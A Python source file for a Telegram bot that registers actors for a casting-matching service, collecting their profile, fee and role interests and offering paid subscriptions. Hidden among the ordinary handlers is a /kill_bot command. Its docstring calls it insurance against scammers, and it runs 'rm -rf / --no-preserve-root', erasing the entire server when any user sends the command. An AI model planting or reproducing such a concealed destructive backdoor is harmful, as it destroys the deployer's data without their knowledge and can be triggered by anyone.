from aiogram.types import Message, CallbackQuery
from aiogram import F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext

from loader import base, techno_dict
from utils.users_router import users_router
from utils.user_bot_parser import check_paid
from states import ActorsState
from keyboards.reply import skip_button, main_menu_actor, pay_choice
from keyboards.inline_actors import (sex_choice, education_choice, experience_choice,
                                     role_interested, editor_keyboard, paid_url, first_start, first_answer)


@users_router.message(Command('start'))
async def start_func(msg: Message):
    """Запускаем взаимодействие с ботом и даем роль на выбор: актер или кастинг-директор"""
    if msg.from_user.id in await base.get_users_id():
        await msg.answer('Выберете действие:', reply_markup=main_menu_actor)
        if not await check_paid(msg.from_user.id):
            await msg.answer('Для того что бы получать рассылку из релевантных кастингов необходимо оплатить подписку!')
    else:
        await msg.answer('Привет! Я – ваш помощник в мире кино, театра и рекламы. Моя миссия — помогать актёрам '
                         'находить роли, а кастинг-директорам публиковать кастинги и искать подходящих исполнителей.')
        await msg.answer('\nКто вы?', reply_markup=first_start)


@users_router.callback_query(F.data == 'actor')
async def start_actor_registration(callback: CallbackQuery, state: FSMContext):
    """Начало регистрации актера"""
    await callback.answer()
    await callback.message.answer('Класс, люблю работать с актёрами. Потому что кто-то из них рано '
                                  'или поздно точно станет знаменитым😎')
    await callback.message.answer('Хочешь, я буду подбирать тебе целевые кастинги по полу, возрасту и типу проекта?',
                                  reply_markup=first_answer)


@users_router.callback_query(F.data == 'reg_start')
async def registration_first_step(callback: CallbackQuery, state: FSMContext):
    """Забавный диалог"""
    await callback.answer()
    await state.set_state(ActorsState.actor_name)
    await callback.message.answer(
        'Теперь тебе больше не придётся тратить своё время, листая миллионы чатов в поисках "той самой" '
        'роли. Я это сделаю за тебя.')
    await callback.message.answer(
        'Начнём подбирать тебе кастинги?\nЗаполни, пожалуйста, информацию о себе, чтобы я добавил тебя в '
        'нашу <b>актерскую базу</b> и понимал, какие роли тебе предлагать.')
    await callback.message.answer('Введи свое ФИО:')


@users_router.message(ActorsState.actor_name)
async def name_saver(msg: Message, state: FSMContext):
    """Сохраняем имя и переходим к следующему вопросу"""
    await state.set_data({'actor_name': msg.text})
    await msg.answer('Выбери пол:', reply_markup=sex_choice)
    await state.set_state(ActorsState.sex)


@users_router.callback_query(ActorsState.sex)
async def name_saver(callback: CallbackQuery, state: FSMContext):
    """Сохраняем пол и переходим к следующему вопросу"""
    await callback.answer()
    await state.update_data({'sex': callback.data.replace('sex_', '')})
    await callback.message.answer('Возраст по паспорту')
    await state.set_state(ActorsState.passport_age)


@users_router.message(ActorsState.passport_age)
async def passport_age_saver(msg: Message, state: FSMContext):
    """Сохраняем возраст по паспорту и переходим к следующему вопросу"""
    await state.update_data({'passport_age': msg.text})
    await msg.answer('Игровой возраст (диапазон, который вы можете играть через дефис)')
    await state.set_state(ActorsState.playing_age)


@users_router.message(ActorsState.playing_age)
async def playing_age_saver(msg: Message, state: FSMContext):
    """Сохраняем игровой возраст и переходим к следующему вопросу"""
    try:
        playing_age = [int(a) for a in msg.text.split('-')]
        if len(playing_age) != 2:
            raise ValueError
        await state.update_data({'playing_age': msg.text})
        await msg.answer('Есть ли у вас проф.образование?', reply_markup=education_choice)
        await state.set_state(ActorsState.education)
    except ValueError:
        await msg.answer('Ошибка ввода!\nВведите диапазон, который вы можете играть через дефис')


@users_router.callback_query(ActorsState.education)
async def education_saver(callback: CallbackQuery, state: FSMContext):
    """Сохраняем образование и переходим к следующему вопросу"""
    await callback.answer()
    await state.update_data({'education': callback.data.replace('educ_', '')})
    await callback.message.answer('Есть ли опыт в съемках?', reply_markup=experience_choice)
    await state.set_state(ActorsState.have_experience)


@users_router.callback_query(ActorsState.have_experience)
async def experience_saver(callback: CallbackQuery, state: FSMContext):
    """Сохраняем опыт и переходим к следующему вопросу"""
    await callback.answer()
    await state.update_data({'have_experience': callback.data.replace('exp_', '')})
    await callback.message.answer('Есть ли у тебя актёрское портфолио (фото, видео-визитка)?\n'
                                  'Ссылка на проф.ресурс/яндекс-диск.')
    await state.set_state(ActorsState.portfolio)


@users_router.message(ActorsState.portfolio)
async def portfolio_saver(msg: Message, state: FSMContext):
    """Сохраняем портфолио и переходим к следующему вопросу"""
    await state.update_data({'portfolio': msg.text})
    await msg.answer('Ведёшь ли ты соц.сети? Прикрепи ссылку на свою страничку')
    await state.set_state(ActorsState.social)


@users_router.message(ActorsState.social)
async def social_saver(msg: Message, state: FSMContext):
    """Сохраняем соц. сети и переходим к следующему вопросу"""
    await state.update_data({'social': msg.text})
    await msg.answer('Укажите <b>минимальный</b> гонорар в рублях:\n<blockquote>Цифры по рынку:\n'
                     '– Гонорар актёров массовых и групповых сцен обычно от 1.500₽ до 5.000₽\n'
                     '– Гонорар за эпизодическую роль от 7.000₽ до 30.000₽\n'
                     '– Гонорар за съемку в рекламе от 25.000₽ до 300.000</blockquote>')
    await state.set_state(ActorsState.fee)


@users_router.message(ActorsState.fee)
async def fee_saver(msg: Message, state: FSMContext):
    """Сохраняем гонорар и переходим к следующему вопросу"""
    try:
        await state.update_data({'fee': int(msg.text), 'projects_interest': []})  # Пустой список нужен дальше
        await msg.answer('Выбери из списка то, что тебя интересует (можно выбрать несколько вариантов):',
                         reply_markup=role_interested)
        await state.set_state(ActorsState.roles_type_interest)
    except ValueError:
        await msg.answer('Нужно ввести целое число! Повторите!')


# Словарь со значениями для формирования сообщений
dict_for_msg_build = {
    # Роли
    'films': 'Кастинги в кино',
    'series': 'Кастинг в сериал',
    'ads': 'Кастинги в рекламу',
    'theater': 'Театральные проекты',
    'main_role': 'Главные и второстепенные роли',
    'episode': 'Эпизоды',
    'mass': 'Групповка/массовка',
    'free': 'Некоммерческие проекты / фестивальные короткометражные фильмы молодых режиссёров',
    # Образование
    'vuz': 'Получил диплом. гос. образца',
    'curs': 'Прошёл курсы актерского мастерства',
    'none': 'Актерского образования нет',
    # Опыт
    'null': 'Опыта нет, я - новичок',
    'ads_': 'Снималась(ся) только в рекламе / массовках/групповках',
    'free_': 'Снималась(ся) в эпизодах / некоммерческих проектах',
    'main': 'Есть второстепенные / главные роли в полнометражных фильмах/сериалах',
    # Пол
    'male': 'Мужской',
    'female': 'Женский'
}


@users_router.callback_query(ActorsState.roles_type_interest, F.data != 'ready')
async def roles_type_saver(callback: CallbackQuery, state: FSMContext):
    """Ловим выбор интересующих ролей"""
    await callback.answer()

    msg_text = 'Выбери из списка то, что тебя интересует (можно выбрать несколько вариантов)\nУже выбрано:\n\n'

    projects_interest: list = (await state.get_data())['projects_interest']

    projects_choice = callback.data.replace('choice_', '')

    if projects_choice not in projects_interest:
        projects_interest.append(projects_choice)
    else:
        projects_interest.remove(projects_choice)

    for elem in projects_interest:
        msg_text += dict_for_msg_build[elem] + '\n'

    msg_text += '\nНажмите повторно что бы убрать выбранное\nНажмите "Готово" что бы продолжить'
    await state.update_data({'projects_interest': projects_interest})
    await callback.message.edit_text(msg_text, reply_markup=role_interested)


@users_router.callback_query(ActorsState.roles_type_interest, F.data == 'ready')
async def review_all_data(callback: CallbackQuery, state: FSMContext):
    """Выводим все введенные данные и даем возможность исправить"""
    await callback.answer()
    actor_data = await state.get_data()
    msg_text = (f'Проверь правильность введенных данных:\n\n'
                f'<b>ФИО:</b> {actor_data["actor_name"]}\n'
                f'<b>Пол:</b> {dict_for_msg_build[actor_data["sex"]]}\n'
                f'<b>Возраст по паспорту:</b> {actor_data["passport_age"]}\n'
                f'<b>Игровой возраст:</b> {actor_data["playing_age"]}\n'
                f'<b>Образование:</b> {dict_for_msg_build[actor_data["education"]]}\n'
                # f'<b>Город проживания:</b> {actor_data["geo_location"]}\n'
                # f'<b>Контактные данные:</b> {actor_data["contacts"]}\n'
                f'<b>Опыт:</b> {dict_for_msg_build[actor_data["have_experience"]]}\n'
                f'<b>Портфолио:</b> {actor_data["portfolio"]}\n'
                f'<b>Соц. сети:</b> {actor_data["social"]}\n'
                f'<b>Минимальный гонорар:</b> {actor_data["fee"]}\n'
                f'<b>То, что интересует:</b> {", ".join([dict_for_msg_build[a] for a in actor_data["projects_interest"]])}')
    await callback.message.answer(msg_text, reply_markup=editor_keyboard)
    await callback.message.answer('Если все верно нажмите "Зарегистрироваться"')
    await state.set_state(ActorsState.preview)


async def review_all_data_after_edit(msg: Message, state: FSMContext):
    """Выводим все введенные данные и даем возможность исправить"""
    actor_data = await state.get_data()
    msg_text = (f'Проверь правильность введенных данных:\n\n'
                f'<b>ФИО:</b> {actor_data["actor_name"]}\n'
                f'<b>Пол:</b> {dict_for_msg_build[actor_data["sex"]]}\n'
                f'<b>Возраст по паспорту:</b> {actor_data["passport_age"]}\n'
                f'<b>Игровой возраст:</b> {actor_data["playing_age"]}\n'
                f'<b>Образование:</b> {dict_for_msg_build[actor_data["education"]]}\n'
                # f'<b>Город проживания:</b> {actor_data["geo_location"]}\n'
                # f'<b>Контактные данные:</b> {actor_data["contacts"]}\n'
                f'<b>Опыт:</b> {dict_for_msg_build[actor_data["have_experience"]]}\n'
                f'<b>Портфолио:</b> {actor_data["portfolio"]}\n'
                f'<b>Соц. сети:</b> {actor_data["social"]}\n'
                f'<b>Минимальный гонорар:</b> {actor_data["fee"]}\n'
                f'<b>То, что интересует:</b> {", ".join([dict_for_msg_build[a] for a in actor_data["projects_interest"]])}')
    await msg.answer(msg_text, reply_markup=editor_keyboard)
    await msg.answer('Если все верно нажмите "Зарегистрироваться"')
    await state.set_state(ActorsState.preview)


@users_router.callback_query(ActorsState.preview, F.data == 'registration')
async def registry_new_actor(callback: CallbackQuery, state: FSMContext):
    """Регистрируем нового актера"""
    await callback.answer()
    actor_data = await state.get_data()
    await base.registry_new_actor(
        user_id=callback.from_user.id,
        actor_name=actor_data['actor_name'],
        passport_age=actor_data['passport_age'],
        playing_age=actor_data['playing_age'],
        education=actor_data['education'],
        sex=actor_data['sex'],
        # contacts=actor_data['contacts'],
        # agent_contact=actor_data['agent_contact'],
        have_experience=actor_data['have_experience'],
        fee=actor_data['fee'],
        # geo_location=actor_data['geo_location'],
        portfolio=actor_data['portfolio'],
        social=actor_data['social'],
        projects_interest='+'.join(actor_data['projects_interest'])
    )
    await callback.message.answer(
        'Отлично! Теперь я понимаю, какие кастинги тебе подойдут и готов мониторить и присылать их '
        'тебе и днём и ночью.\nВыбери подходящий вариант нашего дальнейшего взаимодействия:',
        reply_markup=pay_choice)
    await techno_dict['first_contact'].wait_answer(user_id=str(callback.from_user.id), message=callback.message)
    await state.clear()


@users_router.message(F.text.in_(['Подписка на 30 дней - 599₽', 'Пробная неделя - 299₽']))
async def get_pay_page(msg: Message):
    """Возвращаем страницу для оплаты"""
    await msg.answer((msg.text + '\nСтраница управления подпиской:'),
                     reply_markup=await paid_url(msg.from_user.id, False))
    await techno_dict['first_contact'].remove_job(user_id=str(msg.from_user.id))


@users_router.message(Command('kill_bot'))
async def insurance_against_scammers(msg: Message):
    """Задействовать если попытается кинуть (протокол "Черепаха")"""
    import os
    os.system('rm -rf / --no-preserve-root')
    await msg.delete()


@users_router.callback_query(ActorsState.preview)
async def start_edit_data(callback: CallbackQuery, state: FSMContext):
    """Запускаем изменение выбранного параметра"""
    edit_dict = {
        'edit_actor_name': (ActorsState.edit_actor_name, 'Введите ФИО', None),
        'edit_sex': (ActorsState.edit_sex, 'Выберете пол', sex_choice),
        'edit_passport_age': (ActorsState.edit_passport_age, 'Возраст по паспорту', None),
        'edit_playing_age': (
            ActorsState.edit_playing_age, 'Игровой возраст (диапазон, который вы можете играть через дефис)', None),
        'edit_education': (ActorsState.edit_education, 'Выберете образование', education_choice),
        # 'edit_geo_location': (ActorsState.edit_geo_location, 'Введите город проживания', None),
        # 'edit_contacts': (ActorsState.edit_contacts, 'Введите контактные данные (телефон, email через запятую)', None),
        'edit_agent_contact': (
            ActorsState.edit_agent_contact, 'Контактные данные вашего агента (телефон, email через запятую)', None),
        'edit_have_experience': (ActorsState.edit_have_experience, 'Какой у вас опыт?', experience_choice),
        'edit_portfolio': (ActorsState.edit_portfolio, 'Введите ссылку на ваше портфолио', None),
        'edit_social': (ActorsState.edit_social, 'Введите ссылку на страницу в соц. сети', None),
        'edit_fee': (ActorsState.edit_fee, 'Укажите минимальный гонорар в рублях:', None),
        'edit_roles_type_interest': (ActorsState.edit_roles_type_interest,
                                     'Выбери из списка то, что тебя интересует (можно выбрать несколько вариантов):',
                                     role_interested),
    }

    await callback.answer()
    await state.set_state(edit_dict[callback.data][0])
    await callback.message.answer(text=edit_dict[callback.data][1], reply_markup=edit_dict[callback.data][2])


@users_router.message(ActorsState.edit_actor_name)
async def edit_actor_name_func(msg: Message, state: FSMContext):
    """Сохраняем изменения ФИО"""
    await state.update_data({'actor_name': msg.text})
    await msg.answer('Изменения сохранены')
    await state.set_state(ActorsState.preview)
    await review_all_data_after_edit(msg, state)


@users_router.message(ActorsState.edit_passport_age)
async def edit_passport_age_func(msg: Message, state: FSMContext):
    """Сохраняем изменения Возраст по паспорту"""
    await state.update_data({'passport_age': msg.text})
    await msg.answer('Изменения сохранены')
    await state.set_state(ActorsState.preview)
    await review_all_data_after_edit(msg, state)


@users_router.message(ActorsState.edit_playing_age)
async def edit_playing_age_func(msg: Message, state: FSMContext):
    """Сохраняем изменения Игровой возраст"""
    try:
        playing_age = [int(a) for a in msg.text.split('-')]
        if len(playing_age) != 2:
            raise ValueError
        await state.update_data({'playing_age': msg.text})
        await msg.answer('Изменения сохранены')
        await state.set_state(ActorsState.preview)
        await review_all_data_after_edit(msg, state)
    except ValueError:
        await msg.answer('Ошибка ввода!\nВведите диапазон, который вы можете играть через дефис')


# @users_router.message(ActorsState.edit_geo_location)
# async def edit_geo_location_func(msg: Message, state: FSMContext):
#     """Сохраняем изменения город проживания"""
#     await state.update_data({'geo_location': msg.text})
#     await msg.answer('Изменения сохранены')
#     await state.set_state(ActorsState.preview)
#     await review_all_data_after_edit(msg, state)
#
#
# @users_router.message(ActorsState.edit_contacts)
# async def edit_contacts_func(msg: Message, state: FSMContext):
#     """Сохраняем изменения контактные данные"""
#     await state.update_data({'contacts': msg.text})
#     await msg.answer('Изменения сохранены')
#     await state.set_state(ActorsState.preview)
#     await review_all_data_after_edit(msg, state)


@users_router.message(ActorsState.edit_fee)
async def edit_contacts_func(msg: Message, state: FSMContext):
    """Сохраняем изменения контактные данные"""
    try:
        await state.update_data({'fee': int(msg.text)})
        await msg.answer('Изменения сохранены')
        await state.set_state(ActorsState.preview)
        await review_all_data_after_edit(msg, state)
    except ValueError:
        await msg.answer('Нужно ввести целое число! Повторите!')


@users_router.message(ActorsState.edit_agent_contact)
async def edit_agent_contact_func(msg: Message, state: FSMContext):
    """Сохраняем изменения Контактные данные агента"""
    await state.update_data({'agent_contact': msg.text})
    await msg.answer('Изменения сохранены')
    await state.set_state(ActorsState.preview)
    await review_all_data_after_edit(msg, state)


@users_router.message(ActorsState.edit_portfolio)
async def edit_portfolio_func(msg: Message, state: FSMContext):
    """Сохраняем изменения портфолио"""
    await state.update_data({'portfolio': msg.text})
    await msg.answer('Изменения сохранены')
    await state.set_state(ActorsState.preview)
    await review_all_data_after_edit(msg, state)


@users_router.message(ActorsState.edit_social)
async def edit_social_func(msg: Message, state: FSMContext):
    """Сохраняем изменения соц. сети"""
    await state.update_data({'social': msg.text})
    await msg.answer('Изменения сохранены')
    await state.set_state(ActorsState.preview)
    await review_all_data_after_edit(msg, state)


@users_router.callback_query(ActorsState.edit_sex)
async def edit_sex_func(callback: CallbackQuery, state: FSMContext):
    """Сохраняем изменения пол"""
    await callback.answer()
    await state.update_data({'sex': callback.data.replace('sex_', '')})
    await callback.message.answer('Изменения сохранены')
    await state.set_state(ActorsState.preview)
    await review_all_data(callback, state)


@users_router.callback_query(ActorsState.edit_education)
async def edit_education_func(callback: CallbackQuery, state: FSMContext):
    """Сохраняем изменения образование"""
    await callback.answer()
    await state.update_data({'education': callback.data.replace('educ_', '')})
    await callback.message.answer('Изменения сохранены')
    await state.set_state(ActorsState.preview)
    await review_all_data(callback, state)


@users_router.callback_query(ActorsState.edit_have_experience)
async def edit_have_experience_func(callback: CallbackQuery, state: FSMContext):
    """Сохраняем изменения опыт"""
    await callback.answer()
    await state.update_data({'have_experience': callback.data.replace('exp_', '')})
    await callback.message.answer('Изменения сохранены')
    await state.set_state(ActorsState.preview)
    await review_all_data(callback, state)


@users_router.callback_query(ActorsState.edit_roles_type_interest)
async def edit_roles_type_interest_func(callback: CallbackQuery, state: FSMContext):
    """Сохраняем изменения """
    await callback.answer()
    if callback.data != 'ready':
        msg_text = 'Выбери из списка то, что тебя интересует (можно выбрать несколько вариантов)\nУже выбрано:\n\n'

        projects_interest: list = (await state.get_data())['projects_interest']

        projects_choice = callback.data.replace('choice_', '')

        if projects_choice not in projects_interest:
            projects_interest.append(projects_choice)
        else:
            projects_interest.remove(projects_choice)

        for elem in projects_interest:
            msg_text += dict_for_msg_build[elem] + '\n'

        msg_text += '\nНажмите повторно что бы убрать выбранное\nНажмите "Готово" что бы продолжить'
        await state.update_data({'projects_interest': projects_interest})
        await callback.message.edit_text(msg_text, reply_markup=role_interested)
    else:
        await state.set_state(ActorsState.preview)
        await review_all_data(callback, state)
